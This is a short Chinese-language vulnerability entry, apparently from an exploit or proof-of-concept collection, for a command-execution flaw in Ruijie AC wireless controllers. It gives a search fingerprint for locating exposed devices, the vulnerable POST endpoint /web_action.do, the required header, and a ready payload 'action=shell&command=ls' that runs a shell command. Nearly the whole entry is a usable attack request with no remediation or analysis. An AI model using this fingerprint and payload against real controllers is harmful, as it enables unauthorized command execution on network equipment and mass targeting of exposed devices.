# 锐捷AC无线控制器存在命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`web.body="简网络，玩智分，无线移动体验 "`
- **请求**：`POST /web_action.do HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
action=shell&command=ls
>
```

**其他**
- 版本: 锐捷AC无线控制器